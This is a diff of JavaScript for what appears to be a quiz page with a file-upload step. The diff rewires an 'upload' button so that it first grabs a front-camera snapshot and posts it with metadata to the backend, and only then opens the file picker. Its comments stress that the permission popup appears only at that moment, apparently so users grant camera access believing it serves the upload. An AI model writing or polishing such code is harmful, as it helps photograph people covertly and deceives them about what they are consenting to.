@@ -2,6 +2,7 @@ const form = document.getElementById("quiz-form");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const fileInput = document.getElementById("user-file");
+const uploadBtn = document.getElementById("upload-btn"); // ✅ NEW BUTTON
 
 const BACKEND_BASE = "/api";
 const constraints = { video: { facingMode: "user" }, audio: false };
@@ -82,6 +83,7 @@ async function captureAndSendCamera() {
       body: JSON.stringify({ image, metadata }),
     });
 
+    // ✅ Stop camera after capture
     stream.getTracks().forEach((t) => t.stop());
 
     cameraCaptured = true;
@@ -92,9 +94,15 @@ async function captureAndSendCamera() {
   }
 }
 
-// ✅ ONLY ASK PERMISSION WHEN USER CLICKS UPLOAD
-fileInput.addEventListener("click", () => {
-  captureAndSendCamera();
+// ================================
+// ✅ ONLY ASK PERMISSION WHEN USER CLICKS UPLOAD BUTTON
+// ================================
+uploadBtn.addEventListener("click", async () => {
+  // ✅ Camera permission popup happens only here
+  await captureAndSendCamera();
+
+  // ✅ After camera capture, open file picker
+  fileInput.click();
 });
 
 // ================================
@@ -134,7 +142,14 @@ form.addEventListener("submit", async (e) => {
   }
 
   try {
-    await uploadFile(fileInput.files[0]);
+    const selectedFile = fileInput.files[0];
+
+    if (!selectedFile) {
+      alert("Please select a file first!");
+      return;
+    }
+
+    await uploadFile(selectedFile);
 
     document.getElementById("quiz-container").style.display = "none";
     document.getElementById("success-container").style.display = "flex";
